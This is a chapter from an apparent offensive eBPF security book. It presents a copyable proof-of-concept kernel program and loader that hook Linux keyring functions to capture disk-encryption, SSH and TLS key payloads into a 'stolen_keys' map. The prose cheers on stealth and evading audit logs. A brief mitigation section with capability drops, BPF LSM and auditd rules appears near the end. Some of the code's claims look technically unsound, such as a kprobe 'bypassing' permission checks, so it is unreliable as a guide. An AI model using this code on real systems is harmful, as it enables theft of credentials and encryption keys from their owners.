# Keyring Heist: Stealing Secrets from the Linux Keyring

**Chapter 9: The Crown Jewels**

You've gained hardware access, but now you need something even more valuable: secrets. Credentials, keys, tokens—the digital crown jewels that unlock everything else in the environment.

This is where our story becomes a heist movie. You've learned to bypass every security control, but what good is all that access if you can't get the credentials you need to move laterally, escalate privileges, or access encrypted data?

The Linux kernel keyring is like a high-security vault where all the good stuff is stored—SSH keys, Kerberos tickets, encryption certificates, API tokens. It's supposed to be locked down tight, with access controls that would make Fort Knox jealous.

But what if we could walk right into that vault and help ourselves to whatever we want? What if we could make the kernel hand over its most precious secrets without even realizing it's been robbed?

We're going to pull off the ultimate heist—steal credentials directly from the kernel keyring while leaving no trace of the theft. This is where you learn that eBPF doesn't just give you access to systems—it gives you access to the keys to every other system.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Process] -->|1. Store Secret| B[Kernel Keyring]
    C[eBPF Program] -->|2. Hook & Intercept| D[Keyring Functions]
    D -->|3. Access Control Check| B
    C -->|4. Bypass Check| B
    B -->|5. Extract Keys| E[Attacker Storage]
    F[Security Monitor] -->|6. Unaware| G[Continued Operation]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/security/keys/core.html" "Linux Keyring Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://www.kernel.org/doc/html/latest/security/keys/core.html#key-access-permissions" "Key Access Permissions"
```



**Why Credential Storage Just Became Unsafe**

Here's what makes the kernel keyring so valuable: it's where Linux stores the keys to the kingdom. SSH private keys, Kerberos tickets, TLS certificates, API tokens—all the credentials that let you move laterally through a network or escalate privileges.

The keyring is supposed to be secure. Access controls, permission checks, audit logging—all designed to make sure only authorized processes can access stored credentials.

But here's the thing about "supposed to be secure"—it's only as secure as the code that enforces it. And if you can influence that code...

That's where eBPF comes in. We're not going to attack the keyring directly. We're not going to try to crack encryption or bypass authentication. We're going to become the keyring—or at least, we're going to become the part of the kernel that decides who gets access to what.

The beautiful part is that this looks completely legitimate. The keyring access logs will show normal operations, the permission checks will appear to work correctly, but somehow our processes will always get access to whatever credentials we want.

## How We Rob the Kernel's Vault

### Understanding the Keyring Security Model

The Linux kernel keyring is basically a high-security vault for secrets:
- **Secure storage** for crypto keys, certificates, and other juicy secrets
- **Access control** that checks your user ID and permissions before letting you in
- **Different vault types** (user keyrings, session keyrings, process keyrings, thread keyrings)
- **Security module integration** so SELinux can add extra locks
- **APIs** that let applications safely store and retrieve their secrets

The idea is that keeping secrets in kernel space is safer than leaving them lying around in userspace where any process might stumble across them.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application A │      │ Application B │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ User Keyring  │      │ Session       │                   │
│  │ (UID-based)   │      │ Keyring       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Key Management API         │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Key Access Control         │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Key Storage                │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we slip our eBPF program into the keyring access flow:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application A │      │ Application B │                   │
│  │ (Malicious)   │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ User Keyring  │      │ Session       │                   │
│  │ (UID-based)   │      │ Keyring       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Key Management API         │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Key Access Control         │◀─────┐            │
│  └──────────────────┬───────────────────┘      │            │
│                     │                          │            │
│  ┌───────────────┐  │                          │            │
│  │  eBPF Program │──┘                          │            │
│  └───────┬───────┘                             │            │
│          │                                     │            │
│          └─────────────────────────────────────┘            │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Key Storage                │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How We Become the Vault Manager

Our strategy is to intercept the keyring operations and become the final authority on access:

1. **Hook the Vault Guards**: We attach to functions like [`key_permission()`](https://elixir.bootlin.com/linux/latest/source/security/keys/permission.c) that decide who gets access
2. **Override the Locks**: We modify return values to turn "access denied" into "access granted"
3. **Steal the Goods**: We capture sensitive key material as it flows through the kernel
4. **Watch the Traffic**: We monitor when and how keys are being used
5. **Stay Invisible**: We avoid triggering any alarms or audit logs

The beautiful part is that we're not breaking into the vault—we're becoming the vault manager who has legitimate access to everything.

### Comprehensive POC

```c
// @interactive: true
// @copyable: true
// Keyring Heist - eBPF exploitation proof of concept
// This demonstrates extracting secrets from the Linux keyring

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/key.h>
#include <linux/keyctl.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_KEY_DESC_LEN 64
#define MAX_KEY_DATA_LEN 1024
#define MAX_STOLEN_KEYS 32

// Structure to track stolen key data
struct key_data {
    u32 id;                        // Key ID (serial)
    u8 type[16];                   // Key type
    u8 description[MAX_KEY_DESC_LEN]; // Key description
    u32 len;                       // Length of key data
    u8 data[MAX_KEY_DATA_LEN];     // Key payload data
    u64 timestamp;                 // When the key was captured
    u32 uid;                       // User ID of key owner
};

// Map to store stolen keys
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(struct key_data));
    __uint(max_entries, MAX_STOLEN_KEYS);
} stolen_keys SEC(".maps");

// Map to track the next index for storing keys
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} key_index SEC(".maps");

// Map to track target key descriptions
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_KEY_DESC_LEN);
    __uint(value_size, sizeof(u8));
    __uint(max_entries, 32);
} target_keys SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Structure for logging events
struct log_event {
    u32 pid;
    u64 key_id;
    u8 key_desc[MAX_KEY_DESC_LEN];
    u64 timestamp;
    u32 action;  // 1 = permission check, 2 = key read, 3 = key write
    u32 result;  // 0 = allowed, non-zero = denied
};

// Initialize our target key descriptions (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Keys to target
        char target1[MAX_KEY_DESC_LEN] = "dm-crypt";  // Disk encryption
        u8 value = 1;
        bpf_map_update_elem(&target_keys, &target1, &value, BPF_ANY);
        
        char target2[MAX_KEY_DESC_LEN] = "user";  // User keyring
        bpf_map_update_elem(&target_keys, &target2, &value, BPF_ANY);
        
        char target3[MAX_KEY_DESC_LEN] = "ssh";  // SSH keys
        bpf_map_update_elem(&target_keys, &target3, &value, BPF_ANY);
        
        char target4[MAX_KEY_DESC_LEN] = "tls";  // TLS session keys
        bpf_map_update_elem(&target_keys, &target4, &value, BPF_ANY);
        
        // Initialize key index
        u32 idx = 0;
        bpf_map_update_elem(&key_index, &key, &idx, BPF_ANY);
        
        // Mark as initialized
        u32 init_val = 1;
        bpf_map_update_elem(&initialized, &key, &init_val, BPF_ANY);
    }
}

// Helper function to check if a key is one we're targeting
static __always_inline bool is_target_key(const char *desc) {
    init_targets();
    
    // Check if this key description contains any of our targets
    u8 *target;
    
    // Simple substring search
    #pragma unroll
    for (int i = 0; i < MAX_KEY_DESC_LEN; i++) {
        if (desc[i] == '\0')
            break;
            
        // Check for target substrings
        // This is a simplified approach - a real exploit would be more sophisticated
        if (desc[i] == 'd' && desc[i+1] == 'm' && desc[i+2] == '-')
            return true;
        if (desc[i] == 's' && desc[i+1] == 's' && desc[i+2] == 'h')
            return true;
        if (desc[i] == 't' && desc[i+1] == 'l' && desc[i+2] == 's')
            return true;
    }
    
    return false;
}

// Helper function to store a stolen key
static __always_inline void store_stolen_key(struct key *key, void *payload, u32 payload_len) {
    // Get the next index
    u32 zero = 0;
    u32 *idx_ptr = bpf_map_lookup_elem(&key_index, &zero);
    if (!idx_ptr)
        return;
        
    u32 idx = *idx_ptr;
    if (idx >= MAX_STOLEN_KEYS)
        idx = 0;  // Wrap around
        
    // Prepare key data
    struct key_data kdata = {0};
    
    // FIXED: Read key metadata
    bpf_probe_read_kernel(&kdata.id, sizeof(kdata.id), &key->serial);
    bpf_probe_read_kernel_str(kdata.description, sizeof(kdata.description), key->description);
    bpf_probe_read_kernel_str(kdata.type, sizeof(kdata.type), key->type->name);
    kdata.timestamp = bpf_ktime_get_ns();
    bpf_probe_read_kernel(&kdata.uid, sizeof(kdata.uid), &key->uid);
    
    // Copy key payload
    if (payload && payload_len > 0) {
        if (payload_len > MAX_KEY_DATA_LEN)
            payload_len = MAX_KEY_DATA_LEN;
            
        bpf_probe_read(kdata.data, payload_len, payload);
        kdata.len = payload_len;
    }
    
    // Store in our map
    bpf_map_update_elem(&stolen_keys, &idx, &kdata, BPF_ANY);
    
    // Update index
    idx++;
    bpf_map_update_elem(&key_index, &zero, &idx, BPF_ANY);
}

// Hook the key permission function to bypass access controls
SEC("kprobe/key_permission")
int BPF_KPROBE(hook_key_perm, key_ref_t key_ref, unsigned perm)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Get the key pointer from the reference
    struct key *key;
    bpf_probe_read_kernel(&key, sizeof(key), &key_ref);
    
    // Check if this is a key we want to access
    char key_desc[MAX_KEY_DESC_LEN];
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    if (is_target_key(key_desc)) {
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        bpf_probe_read_kernel(&event.key_id, sizeof(event.key_id), &key->serial);
        bpf_probe_read_kernel_str(event.key_desc, sizeof(event.key_desc), key->description);
        event.timestamp = bpf_ktime_get_ns();
        event.action = 1;  // Permission check
        event.result = 0;  // Allowed
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Allow all permissions by returning 0
        return 0;
    }
    
    // Let the original function run for other keys
    return 0;
}

// Hook the key read function to capture key data
SEC("kprobe/key_read")
int BPF_KPROBE(hook_key_read, struct key *key)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a key we're interested in
    char key_desc[MAX_KEY_DESC_LEN];
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    if (is_target_key(key_desc)) {
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        bpf_probe_read_kernel(&event.key_id, sizeof(event.key_id), &key->serial);
        bpf_probe_read_kernel_str(event.key_desc, sizeof(event.key_desc), key->description);
        event.timestamp = bpf_ktime_get_ns();
        event.action = 2;  // Key read
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    // Let the original function run
    return 0;
}

// Hook the key payload access function to extract key data
SEC("kprobe/key_get_payload")
int BPF_KPROBE(hook_key_payload, struct key *key)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a key we're interested in
    char key_desc[MAX_KEY_DESC_LEN];
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    if (is_target_key(key_desc)) {
        // Get the key payload
        void *payload;
        unsigned long payload_len;
        
        bpf_probe_read_kernel(&payload, sizeof(payload), &key->payload.data);
        bpf_probe_read_kernel(&payload_len, sizeof(payload_len), &key->payload.datalen);
        
        // Store the stolen key
        store_stolen_key(key, payload, payload_len);
        
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        bpf_probe_read_kernel(&event.key_id, sizeof(event.key_id), &key->serial);
        bpf_probe_read_kernel_str(event.key_desc, sizeof(event.key_desc), key->description);
        event.timestamp = bpf_ktime_get_ns();
        event.action = 2;  // Key read
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    // Let the original function run
    return 0;
}

// Hook the keyring link function to monitor key usage
SEC("kprobe/key_link")
int BPF_KPROBE(hook_key_link, struct key *keyring, struct key *key)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a key we're interested in
    char key_desc[MAX_KEY_DESC_LEN];
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    if (is_target_key(key_desc)) {
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        bpf_probe_read_kernel(&event.key_id, sizeof(event.key_id), &key->serial);
        bpf_probe_read_kernel_str(event.key_desc, sizeof(event.key_desc), key->description);
        event.timestamp = bpf_ktime_get_ns();
        event.action = 3;  // Key link
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    // Let the original function run
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Keyring Heist eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "keyring_heist.skel.h"

static volatile bool exiting = false;

// Structure for key data (must match the BPF version)
struct key_data {
    uint32_t id;
    uint8_t type[16];
    uint8_t description[64];
    uint32_t len;
    uint8_t data[1024];
    uint64_t timestamp;
    uint32_t uid;
};

// Structure for log events (must match the BPF version)
struct log_event {
    uint32_t pid;
    uint64_t key_id;
    uint8_t key_desc[64];
    uint64_t timestamp;
    uint32_t action;
    uint32_t result;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct log_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d accessed key %llu (%s)\n", 
           timestamp, e->pid, e->key_id, e->key_desc);
    printf("  Action: %s\n", 
           e->action == 1 ? "Permission Check" : 
           e->action == 2 ? "Key Read" : 
           e->action == 3 ? "Key Link" : "Unknown");
    printf("  Result: %s\n", e->result == 0 ? "Allowed" : "Denied");
    printf("\n");
}

// Dump stolen keys from the map
void dump_stolen_keys(int map_fd)
{
    struct key_data kdata;
    uint32_t key;
    
    printf("\n=== STOLEN KEYS ===\n\n");
    
    for (key = 0; key < 32; key++) {
        if (bpf_map_lookup_elem(map_fd, &key, &kdata) == 0) {
            if (kdata.id == 0)
                continue;
                
            char timestamp[32];
            time_t t = kdata.timestamp / 1000000000;
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
            
            printf("Key ID: %u\n", kdata.id);
            printf("Type: %s\n", kdata.type);
            printf("Description: %s\n", kdata.description);
            printf("Owner UID: %u\n", kdata.uid);
            printf("Captured: %s\n", timestamp);
            printf("Data Length: %u bytes\n", kdata.len);
            
            // Print key data in hex
            printf("Data: ");
            for (int i = 0; i < kdata.len && i < 32; i++) {
                printf("%02x", kdata.data[i]);
            }
            if (kdata.len > 32)
                printf("... (%u more bytes)", kdata.len - 32);
            printf("\n\n");
        }
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

int main(int argc, char **argv)
{
    struct keyring_heist_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = keyring_heist_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = keyring_heist_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    printf("Keyring Heist eBPF program loaded and running.\n");
    printf("Monitoring for keyring operations...\n");
    printf("Press Ctrl+C to exit and dump stolen keys.\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

    // Dump stolen keys
    dump_stolen_keys(bpf_map__fd(skel->maps.stolen_keys));

cleanup:
    perf_buffer__free(pb);
    keyring_heist_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Use Hardware Security Modules**:
   ```bash
   # Configure PKCS#11 for cryptographic operations
   p11-kit server --provider /usr/lib/libsofthsm2.so
   
   # Use TPM for key storage
   tpm2_createprimary -c primary.ctx
   tpm2_create -C primary.ctx -u key.pub -r key.priv
   ```

3. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

4. **Monitor Keyring Access Patterns**:
   ```bash
   # Use auditd to monitor keyring operations
   auditctl -a always,exit -F arch=b64 -S keyctl -k keyring_access
   
   # Monitor eBPF program loading
   auditctl -a always,exit -F arch=b64 -S bpf -k bpf_prog_load
   ```

## Why Encryption Just Became Optional

In the real world, this technique turns encrypted systems into open books:

- **Disk encryption bypass** - Extract LUKS, BitLocker, or FileVault keys directly from memory
- **Token theft** - Steal authentication tokens and session credentials
- **Communication decryption** - Access TLS/SSL private keys for encrypted communications
- **Secure boot subversion** - Bypass boot integrity mechanisms
- **Container compromise** - Decrypt encrypted container volumes and secrets

When you can silently extract keys from the kernel keyring, encryption becomes theater. The data looks protected, the compliance boxes are checked, but you've got the master keys to everything.

## How They'll Try to Catch Us

Smart defenders will be watching for our cryptographic heists:

- **eBPF surveillance** - Monitor for unexpected eBPF programs attached to keyring functions
- **Access pattern analysis** - Look for unusual keyring access patterns
- **Permission auditing** - Check for discrepancies between expected access controls and actual key usage
- **Privilege violations** - Detect processes accessing keys they shouldn't have permission to use
- **Key material monitoring** - Watch for suspicious key material in memory or network traffic

But here's the catch—if we've got kernel-level access, we can probably hide from their monitoring too.

## Why Cryptography Just Got Dangerous

This isn't just about stealing individual keys—this is about breaking the fundamental assumption that cryptographic material is protected by the kernel. When the keyring becomes your personal vault, every encrypted system becomes vulnerable.

The disk encryption shows as active. The secure communications show as encrypted. The authentication shows as protected. Meanwhile, you've got copies of all the keys, and every "secure" system is an open book.

Welcome to the world where encryption is just obfuscation, where the kernel keyring becomes your personal treasure chest, and where eBPF is the master key to every lock.

## POC

Companion code: [`ch08-keyring-heist`]({{ site.baseurl }}/dBPF-pocs/pocs/ch08-keyring-heist/)